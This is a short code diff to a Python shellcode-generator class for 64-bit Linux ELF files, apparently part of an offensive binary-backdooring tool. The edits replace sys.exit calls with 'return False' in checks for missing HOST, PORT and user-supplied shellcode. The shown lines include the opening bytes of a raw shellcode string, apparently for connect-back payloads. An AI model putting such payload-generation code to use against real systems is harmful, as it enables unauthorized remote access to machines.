@@ -52,7 +52,7 @@ class linux_elfI64_shellcode():
         hostocts = []
         if self.HOST is None:
             print "This shellcode requires a HOST parameter -H"
-            sys.exit(1)
+            return False
         for i, octet in enumerate(self.HOST.split('.')):
                 hostocts.append(int(octet))
         self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
@@ -70,7 +70,7 @@ class linux_elfI64_shellcode():
 
         if self.PORT is None:
             print ("Must provide port")
-            sys.exit(1)
+            return False
 
         #64bit shellcode
         self.shellcode1 = "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x0c"
@@ -98,7 +98,7 @@ class linux_elfI64_shellcode():
         """
         if self.PORT is None:
             print ("Must provide port")
-            sys.exit(1)
+            return False
 
         #64bit shellcode
         self.shellcode1 = "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x0c"
@@ -122,7 +122,7 @@ class linux_elfI64_shellcode():
         """
         if self.SUPPLIED_SHELLCODE is None:
             print "[!] User must provide shellcode for this module (-U)"
-            sys.exit(0)
+            return False
         else:
             supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()
 
